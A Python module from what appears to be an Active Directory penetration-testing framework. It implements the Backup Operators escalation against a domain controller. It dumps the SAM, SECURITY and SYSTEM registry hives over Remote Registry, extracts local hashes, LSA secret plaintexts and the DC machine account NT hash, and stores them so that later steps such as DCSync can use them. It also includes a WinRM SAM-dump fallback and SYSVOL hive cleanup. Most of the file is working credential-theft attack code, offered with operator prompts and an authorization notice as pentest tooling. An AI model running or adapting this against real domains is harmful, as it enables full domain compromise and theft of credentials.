"""Backup Operators escalation via NetExec backup_operator module."""

from __future__ import annotations

import sys
import re
from datetime import datetime, timezone
from typing import Any

from rich.prompt import Confirm

from adscan_internal import print_error, print_info_debug, print_warning
from adscan_internal.rich_output import (
    mark_sensitive,
    print_panel,
    print_system_change_warning,
)
from adscan_internal import telemetry
from adscan_internal.cli.ace_step_execution import set_last_execution_outcome
from adscan_internal.services.attack_graph_runtime_service import (
    update_active_step_status,
)
from adscan_internal.services.attack_graph_service import (
    load_attack_graph,
    resolve_domain_node_record_for_domain,
    update_edge_status_by_labels,
)

_EMPTY_NTLM_HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"
_MACHINE_HASH_RE = re.compile(
    r"(?:^|\s)(?:[A-Za-z0-9_.-]+\\)?([A-Za-z0-9_.-]+\$):"
    r"([0-9a-fA-F]{32}):([0-9a-fA-F]{32})(?:::|$)"
)
_HOSTNAME_RE = re.compile(r"\\(name:([A-Za-z0-9_.-]+)\\)", re.IGNORECASE)
_SYSVOL_ARTIFACT_RE = re.compile(
    r"\\\\[\\w\\.-]+\\\\SYSVOL\\\\(SAM|SYSTEM|SECURITY)", re.IGNORECASE
)
_SYSVOL_FILES = (
    "C:\\\\Windows\\\\sysvol\\\\sysvol\\\\SAM",
    "C:\\\\Windows\\\\sysvol\\\\sysvol\\\\SYSTEM",
    "C:\\\\Windows\\\\sysvol\\\\sysvol\\\\SECURITY",
)

_SYSVOL_SHARE_FILES = ("SAM", "SYSTEM", "SECURITY")
_BACKUP_OPS_RELATION = "backup_operator"
_BACKUP_OPS_GROUP_LABEL = "Backup Operators"
_BACKUP_OPS_GRAPH_RELATION = "BackupOperatorEscalation"


def _extract_dc_hostname(output: str) -> str | None:
    match = _HOSTNAME_RE.search(output)
    if match:
        return match.group(2).strip()
    return None


def _extract_machine_nt_hash(output: str, dc_hostname: str | None = None) -> str | None:
    expected_machine_account = (
        f"{str(dc_hostname).strip().upper()}$" if dc_hostname else None
    )
    fallback_nt_hash: str | None = None
    for line in output.splitlines():
        match = _MACHINE_HASH_RE.search(line)
        if match:
            account_name = match.group(1).strip().upper()
            nt_hash = match.group(3).strip()
            if not nt_hash or nt_hash.lower() == _EMPTY_NTLM_HASH:
                print_info_debug(
                    "[backup-ops] Ignoring empty machine NTLM hash candidate "
                    f"for {mark_sensitive(account_name, 'user')}."
                )
                continue
            print_info_debug(
                "[backup-ops] Machine NTLM candidate detected: "
                f"account={mark_sensitive(account_name, 'user')}"
            )
            if expected_machine_account and account_name == expected_machine_account:
                print_info_debug(
                    "[backup-ops] Selected machine NTLM candidate matching parsed DC hostname."
                )
                return nt_hash
            if fallback_nt_hash is None:
                fallback_nt_hash = nt_hash
    if fallback_nt_hash and expected_machine_account:
        print_info_debug(
            "[backup-ops] No machine NTLM candidate matched parsed DC hostname; "
            "using first non-empty machine account hash as fallback."
        )
    elif not fallback_nt_hash:
        print_info_debug(
            "[backup-ops] No non-empty machine NTLM hash candidates were found in module output."
        )
    return fallback_nt_hash


def _should_mark_sysvol_cleanup(output: str) -> bool:
    return bool(_SYSVOL_ARTIFACT_RE.search(output or ""))


def _mark_sysvol_cleanup_pending(
    shell: Any, *, domain: str, pdc: str, hostname: str | None
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    domain_entry["backup_ops_sysvol_cleanup_pending"] = {
        "pdc": pdc,
        "hostname": hostname,
        "paths": list(_SYSVOL_FILES),
    }
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(
        f"[backup-ops] SYSVOL cleanup marked as pending for {marked_domain}."
    )
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist SYSVOL cleanup state.")


def _mark_backup_ops_attempted(
    shell: Any, *, domain: str, username: str, pdc: str, hostname: str | None
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    domain_entry["backup_ops_attempted"] = {
        "username": username,
        "pdc": pdc,
        "hostname": hostname,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_info_debug(
        "[backup-ops] Escalation attempt recorded for "
        f"{marked_domain} (user={marked_user})."
    )
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist Backup Operators attempt state.")


def _mark_backup_ops_success(
    shell: Any, *, domain: str, username: str, pdc: str, hostname: str | None
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    domain_entry["backup_ops_success"] = {
        "username": username,
        "pdc": pdc,
        "hostname": hostname,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_info_debug(
        "[backup-ops] Escalation success recorded for "
        f"{marked_domain} (user={marked_user})."
    )
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist Backup Operators success state.")


def _update_backup_ops_da_edge(
    shell: Any,
    *,
    domain: str,
    status: str,
    notes: dict[str, object] | None = None,
) -> None:
    graph = load_attack_graph(shell, domain)
    domain_record = resolve_domain_node_record_for_domain(shell, domain, graph=graph)
    domain_label = str(
        domain_record.get("label") or domain_record.get("name") or domain
    ).strip()
    update_edge_status_by_labels(
        shell,
        domain,
        from_label=_BACKUP_OPS_GROUP_LABEL,
        relation=_BACKUP_OPS_GRAPH_RELATION,
        to_label=domain_label,
        status=status,
        notes=notes,
    )


def record_backup_ops_discovered(shell: Any, *, domain: str, username: str) -> None:
    _update_backup_ops_da_edge(
        shell,
        domain=domain,
        status="discovered",
        notes={"action": _BACKUP_OPS_GRAPH_RELATION},
    )


def _clear_sysvol_cleanup_pending(shell: Any, *, domain: str) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    if "backup_ops_sysvol_cleanup_pending" not in domain_entry:
        return
    domain_entry.pop("backup_ops_sysvol_cleanup_pending", None)
    shell.domains_data[domain] = domain_entry
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(f"[backup-ops] SYSVOL cleanup cleared for {marked_domain}.")
    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()  # type: ignore[attr-defined]
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_error("Failed to persist SYSVOL cleanup state.")


def _build_backup_ops_smb_config(
    *, pdc_ip: str, pdc_hostname: str, domain: str, username: str, password: str
) -> Any:
    """Build the SMBConfig for the SYSVOL cleanup, mirroring the RRP dump path."""
    from adscan_internal.services.smb_transport import SMBConfig

    is_hash = len(password) == 32 and all(
        c in "0123456789abcdef" for c in password.lower()
    )
    return SMBConfig(
        target_ip=pdc_ip,
        target_hostname=pdc_hostname or None,
        domain=domain,
        auth_domain=domain,
        username=username,
        password=None if is_hash else password,
        nt_hash=password if is_hash else None,
        kdc_ip=pdc_ip,
        use_kerberos=False,
    )


async def _native_sysvol_hive_scan(
    smb_config: Any, *, pdc: str, delete: bool
) -> list[str]:
    """List (and optionally delete) SAM/SYSTEM/SECURITY hives at the SYSVOL root.

    Native replacement for the nxc SMB ``dir``/``del`` exec + share listing:
    enumerates the SYSVOL share root via ``SMBDirectory.list_r`` and, when
    ``delete`` is set, removes each hive via ``delete_unc_file`` then re-lists to
    verify. Returns the hive names STILL present (empty list = clean).
    """
    from aiosmb.commons.interfaces.directory import SMBDirectory

    from adscan_internal.services.smb_transport import (
        delete_unc_file,
        smb_machine_for,
    )

    unc_root = f"\\\\{pdc}\\SYSVOL"

    async def _present(connection: Any) -> list[str]:
        found: list[str] = []
        root = SMBDirectory.from_uncpath(unc_root)
        async for path, otype, err in root.list_r(connection, depth=1):
            if err is not None or otype != "file":
                continue
            name = str(path.fullpath).replace("/", "\\").split("\\")[-1]
            if name.upper() in _SYSVOL_SHARE_FILES:
                found.append(name)
        return found

    async with smb_machine_for(smb_config) as machine:
        connection = machine.connection
        present = await _present(connection)
        if not delete:
            return present
        for name in present:
            try:
                await delete_unc_file(machine, f"{unc_root}\\{name}")
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
        return await _present(connection)


def handle_backup_ops_sysvol_cleanup(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    if not hasattr(shell, "domains_data") or not isinstance(shell.domains_data, dict):
        return
    domain_entry = shell.domains_data.get(domain)
    if not isinstance(domain_entry, dict):
        return
    if not (
        domain_entry.get("backup_ops_attempted")
        or domain_entry.get("backup_ops_success")
        or domain_entry.get("backup_ops_sysvol_cleanup_pending")
    ):
        return
    pending = domain_entry.get("backup_ops_sysvol_cleanup_pending")
    pdc = (pending or {}).get("pdc") if isinstance(pending, dict) else None
    hostname = (pending or {}).get("hostname") if isinstance(pending, dict) else None
    pdc = pdc or domain_entry.get("pdc")
    hostname = hostname or domain_entry.get("pdc_hostname")
    if not pdc:
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_host = mark_sensitive(str(hostname or pdc), "hostname")
    from adscan_internal.services.async_bridge import run_async_sync

    smb_config = _build_backup_ops_smb_config(
        pdc_ip=str(pdc),
        pdc_hostname=str(hostname or ""),
        domain=domain,
        username=username,
        password=password,
    )
    sysvol_files = run_async_sync(
        _native_sysvol_hive_scan(smb_config, pdc=str(pdc), delete=False)
    )
    if not sysvol_files:
        _clear_sysvol_cleanup_pending(shell, domain=domain)
        return

    print_panel(
        "\n".join(
            [
                "⚠️  SYSVOL cleanup required",
                f"Domain: {marked_domain}",
                f"Host: {marked_host}",
                "Detected SAM/SYSTEM/SECURITY in SYSVOL.",
                "These files are readable by all domain users until removed.",
            ]
        ),
        title="[bold yellow]Critical Cleanup[/bold yellow]",
        border_style="yellow",
        expand=False,
    )
    if not Confirm.ask("Remove SYSVOL artifacts now?", default=True):
        print_warning(
            "SYSVOL cleanup skipped. Please remove SAM/SYSTEM/SECURITY from SYSVOL manually."
        )
        return

    # Native SMB delete of the SYSVOL hives + re-list verification (no exec).
    remaining = run_async_sync(
        _native_sysvol_hive_scan(smb_config, pdc=str(pdc), delete=True)
    )
    if remaining:
        print_warning(
            "SYSVOL artifacts still present after cleanup attempt. "
            "Please remove them manually."
        )
        print_info_debug(
            "[backup-ops] SYSVOL cleanup verification found remaining files: "
            + ", ".join(remaining)
        )
        print_panel(
            "\n".join(
                [
                    "❗ SYSVOL cleanup failed",
                    f"Domain: {marked_domain}",
                    f"Host: {marked_host}",
                    "Sensitive hives are still present in SYSVOL.",
                    "Stop now and clean them manually to avoid exposure.",
                ]
            ),
            title="[bold red]Cleanup Required[/bold red]",
            border_style="red",
            expand=False,
        )
        if Confirm.ask(
            "Stop execution now to clean SYSVOL manually?",
            default=True,
        ):
            print_warning("Stopping execution for manual SYSVOL cleanup.")
            sys.exit(1)
        return

    _clear_sysvol_cleanup_pending(shell, domain=domain)
    print_panel(
        "\n".join(
            [
                "✅ SYSVOL cleanup completed",
                f"Domain: {marked_domain}",
                f"Host: {marked_host}",
                "SAM/SYSTEM/SECURITY removed from SYSVOL.",
            ]
        ),
        title="[bold green]Cleanup Complete[/bold green]",
        border_style="green",
        expand=False,
    )


def _fallback_winrm_dump(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
) -> None:
    marked_domain = mark_sensitive(domain, "domain")
    marked_host = mark_sensitive(host, "hostname")
    winrm_log = f"domains/{domain}/winrm/dump_{host}_sam.txt"
    marked_log = mark_sensitive(winrm_log, "path")
    print_panel(
        "\n".join(
            [
                "⚠️  SMB module did not yield a usable DC hash",
                f"Fallback: WinRM SAM dump on {marked_host}",
                f"Log file: {marked_log}",
            ]
        ),
        title="[bold yellow]Backup Operators Fallback[/bold yellow]",
        border_style="yellow",
        expand=False,
    )
    print_info_debug(f"[backup-ops] WinRM fallback log path: {marked_log}")
    print_warning(
        "Backup Operators SMB module failed. Falling back to WinRM SAM dump on "
        f"{marked_host} in {marked_domain}."
    )
    try:
        shell.dump_sam_winrm(domain, username, password, host)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Backup Operators WinRM fallback failed.")


def offer_backup_operators_escalation(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> bool:
    """Backup Operators escalation via native async RRP (no netexec).

    Uses NativeDumpService.backup_operator_dump() which opens HKLM\\SAM,
    HKLM\\SECURITY and HKLM\\SYSTEM with REG_OPTION_BACKUP_RESTORE flags,
    downloads the hives via ADMIN$, and parses them in-process.

    Returns True if we extracted a usable DC machine account hash.
    """
    import tempfile

    from adscan_internal.services.async_bridge import run_async_sync
    from adscan_internal.services.exploitation.native_dump_service import NativeDumpService
    from adscan_internal.services.exploitation.dump_display import DumpDisplay, CredentialType
    from adscan_internal.services.smb_transport import SMBConfig

    try:
        pdc_ip: str = str(shell.domains_data.get(domain, {}).get("pdc") or "")
        pdc_hostname: str | None = shell.domains_data.get(domain, {}).get("pdc_hostname")
        if not pdc_ip:
            print_error("Backup Operators escalation requires a PDC IP.")
            update_active_step_status(shell, domain=domain, status="failed",
                                      notes={"reason": "missing_pdc"})
            return False

        marked_domain = mark_sensitive(domain, "domain")
        marked_pdc = mark_sensitive(pdc_ip, "ip")

        # ── UX header ────────────────────────────────────────────────────────
        display = DumpDisplay()
        display.operation_header(
            "Backup Operators (native RRP)", pdc_hostname or pdc_ip, phases=3
        )

        # ── Operator confirmation (non-auto mode) ─────────────────────────
        if not getattr(shell, "auto", False):
            print_system_change_warning(
                title="[bold yellow]Backup Operators Warning[/bold yellow]",
                summary=(
                    f"Saves SAM/SECURITY/SYSTEM hives from {marked_pdc} ({marked_domain}) "
                    "via Remote Registry with SeBackupPrivilege flags."
                ),
                planned_changes=[
                    "Temporarily writes SAM, SECURITY, SYSTEM to C:\\Windows\\Temp on the DC.",
                    "Downloads hives via ADMIN$ and deletes them immediately after.",
                    "Parses DC machine account hash ($MACHINE.ACC) from LSA secrets.",
                ],
                impact_notes=[
                    "Hives are written to Windows\\Temp, not SYSVOL — reduced visibility vs legacy module.",
                    "RemoteRegistry service is started if not running.",
                ],
                cleanup_notes=[
                    "Hives are deleted automatically via SMB after download.",
                    "RemoteRegistry is left running — stop it manually if needed.",
                ],
                authorization_note=(
                    "Only proceed if explicitly authorized to read DC registry hives."
                ),
            )
            if not Confirm.ask("Proceed with Backup Operators escalation?", default=False):
                print_warning("Backup Operators escalation skipped by user.")
                _update_backup_ops_da_edge(shell, domain=domain, status="discovered",
                                           notes={"action": _BACKUP_OPS_GRAPH_RELATION,
                                                  "skipped": True})
                return False

        # ── State tracking ────────────────────────────────────────────────
        _mark_backup_ops_attempted(shell, domain=domain, username=username,
                                   pdc=pdc_ip, hostname=pdc_hostname)
        _update_backup_ops_da_edge(shell, domain=domain, status="attempted",
                                   notes={"action": _BACKUP_OPS_GRAPH_RELATION})
        update_active_step_status(shell, domain=domain, status="attempted",
                                  notes={"action": "backup_operator"})

        # ── DA selection for S4U2Self elevation ──────────────────────────
        # S4U2Self only applies when the incoming credential is the DC's OWN
        # machine account (e.g. DC01$ targeting DC01, not svc_backup, not
        # WEB01$ targeting DC01, not gMSA accounts that also end in "$").
        from adscan_internal.services.exploitation.machine_account_elevation import (
            is_dc_machine_account,
        )
        elevation_target_user: str | None = None
        if is_dc_machine_account(username, pdc_hostname) and not getattr(shell, "auto", False):
            from adscan_internal.cli.privileged_target_selection import (
                resolve_privileged_target_user,
            )
            elevation_target_user = resolve_privileged_target_user(
                shell,
                domain=domain,
                purpose="S4U2Self impersonation via DC machine account",
                require_domain_admin=True,
                exclude_protected_users=True,
                exclude_not_delegated=True,
            )

        # ── Build SMBConfig ───────────────────────────────────────────────
        is_hash = len(password) == 32 and all(c in "0123456789abcdef" for c in password.lower())
        smb_config = SMBConfig(
            target_ip=pdc_ip,
            target_hostname=pdc_hostname,
            domain=domain,
            auth_domain=domain,
            username=username,
            password=None if is_hash else password,
            nt_hash=password if is_hash else None,
            kdc_ip=pdc_ip,
            use_kerberos=False,
        )

        # ── Phase 1: save & download hives ───────────────────────────────
        display.phase_start(1, 3, f"Saving SAM / SECURITY / SYSTEM from {marked_pdc}")
        with tempfile.TemporaryDirectory(prefix="adscan-backupops-") as tmp:
            result = run_async_sync(
                NativeDumpService().backup_operator_dump(
                    smb_config, workspace_dir=tmp, notifier=display,
                    target_user=elevation_target_user,
                )
            )

        if not result.success:
            display.phase_error(f"Hive dump failed: {result.error or 'unknown error'}")
            _update_backup_ops_da_edge(shell, domain=domain, status="failed",
                                       notes={"reason": "dump_failed"})
            update_active_step_status(shell, domain=domain, status="failed",
                                      notes={"reason": "dump_failed"})
            return False

        display.phase_success(
            f"Hives downloaded — SAM: {len(result.sam_hashes)} accounts  "
            f"| LSA: {len(result.lsa_secrets)} secrets"
        )

        # ── Phase 2: stream parsed credentials ───────────────────────────
        display.phase_start(2, 3, "Parsing credentials")
        display.start_credential_stream(f"Backup Operators — {marked_domain}")

        for sam in result.sam_hashes:
            if sam.nt_hash and sam.nt_hash != _EMPTY_NTLM_HASH:
                display.stream_credential(CredentialType.SAM, sam.username, sam.nt_hash)

        machine_nt_hash = result.machine_account_nt_hash
        if machine_nt_hash:
            dc_acct = f"{(pdc_hostname or 'DC').upper()}$"
            display.stream_credential(CredentialType.LSA, dc_acct,
                                      machine_nt_hash, extras="[DC machine account]")

        for secret in result.lsa_secrets:
            if secret.plaintext and secret.name != "$MACHINE.ACC":
                display.stream_credential(CredentialType.LSA, secret.name,
                                          secret.plaintext[:32])

        display.stop_credential_stream()
        display.phase_success("Credential extraction complete")

        # ── Phase 3: persist & escalate ──────────────────────────────────
        display.phase_start(3, 3, "Persisting machine account hash")

        if not machine_nt_hash:
            display.phase_warning(
                "No DC machine account hash in LSA secrets — "
                "escalation incomplete (SAM hashes saved if any)"
            )
            # Still persist any SAM hashes found
            for sam in result.sam_hashes:
                if sam.nt_hash and sam.nt_hash != _EMPTY_NTLM_HASH:
                    shell.add_credential(domain, sam.username, sam.nt_hash,
                                         prompt_for_user_privs_after=False,
                                         credential_origin="backup_operators")
            _update_backup_ops_da_edge(shell, domain=domain, status="failed",
                                       notes={"reason": "no_machine_hash"})
            update_active_step_status(shell, domain=domain, status="failed",
                                      notes={"reason": "no_machine_hash"})
            return False

        dc_hostname_final = pdc_hostname or (pdc_hostname or "DC")
        machine_account = f"{dc_hostname_final.upper()}$"

        _mark_backup_ops_success(shell, domain=domain, username=username,
                                 pdc=pdc_ip, hostname=dc_hostname_final)
        _update_backup_ops_da_edge(shell, domain=domain, status="success",
                                   notes={"action": _BACKUP_OPS_GRAPH_RELATION})
        update_active_step_status(shell, domain=domain, status="success",
                                  notes={"action": "backup_operator"})

        # Summary panel
        display.summary(
            {CredentialType.SAM: len(result.sam_hashes),
             CredentialType.LSA: len(result.lsa_secrets)},
            total=len(result.sam_hashes) + (1 if machine_nt_hash else 0),
            host=pdc_hostname or pdc_ip,
            elapsed=0.0,
        )

        # Persist all recovered credentials.
        # SAM hashes (DC local Administrator, etc.) are saved first without
        # prompting so they land in the store before the machine account
        # escalation prompt fires.
        for sam in result.sam_hashes:
            if sam.nt_hash and sam.nt_hash != _EMPTY_NTLM_HASH:
                shell.add_credential(domain, sam.username, sam.nt_hash,
                                     prompt_for_user_privs_after=False,
                                     credential_origin="backup_operators")

        # LSA service-account plaintext passwords (e.g. DPAPI_SYSTEM excluded
        # since they're not usable credentials on their own).
        # prompt_for_user_privs_after=True: fail-safe for hidden DAs in service
        # accounts with custom names (svc_eng_admin, dom_admin_03, etc.) that
        # the terminal attack-path check would not flag as direct_compromise.
        # The cost is one extra adminCount LDAP query per non-DA secret; the
        # session dedup guard + the "DA already captured" short-circuit in
        # _offer_machine_account_dump_fallback prevent any cascade redundancy.
        _SKIP_LSA = {"$MACHINE.ACC", "DPAPI_SYSTEM(machine)", "DPAPI_SYSTEM(user)"}
        for secret in result.lsa_secrets:
            if secret.plaintext and secret.name not in _SKIP_LSA:
                shell.add_credential(domain, secret.name, secret.plaintext,
                                     prompt_for_user_privs_after=True,
                                     credential_origin="backup_operators")

        # Machine account hash + AES keys (centralised via persist_machine_account_credential).
        from adscan_internal.cli.machine_account_persist import persist_machine_account_credential

        persist_machine_account_credential(
            shell,
            domain=domain,
            machine_account=machine_account,
            nt_hash=machine_nt_hash,
            kerberos_password=result.machine_account_kerberos_password,
            dc_hostname=dc_hostname_final,
            trusted_manual_validation=True,
            ensure_fresh_kerberos_ticket=False,
            prompt_for_user_privs_after=True,
            credential_origin="backup_operators",
        )

        # Promote the recovered DC machine-account credential into the
        # attack-path execution context so the dispatch can hand it off to the
        # next step (e.g. DCSync runs as the DC machine account). Mirrors the
        # roasting / ACE handlers: the source records the outcome, the dispatch
        # calls _apply_execution_outcome_context_handoff on it.
        if machine_nt_hash:
            set_last_execution_outcome(
                shell,
                {
                    "key": "user_credential_obtained",
                    "compromised_user": machine_account,
                    "credential": machine_nt_hash,
                    "credential_type": "nt_hash",
                    "source_action": "BackupOperatorEscalation",
                },
            )

        return True

    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Backup Operators escalation encountered an error.")
        _update_backup_ops_da_edge(shell, domain=domain, status="failed",
                                   notes={"reason": "exception"})
        update_active_step_status(shell, domain=domain, status="failed",
                                  notes={"reason": "exception"})
        return False


__all__ = [
    "record_backup_ops_discovered",
    "offer_backup_operators_escalation",
    "handle_backup_ops_sysvol_cleanup",
]
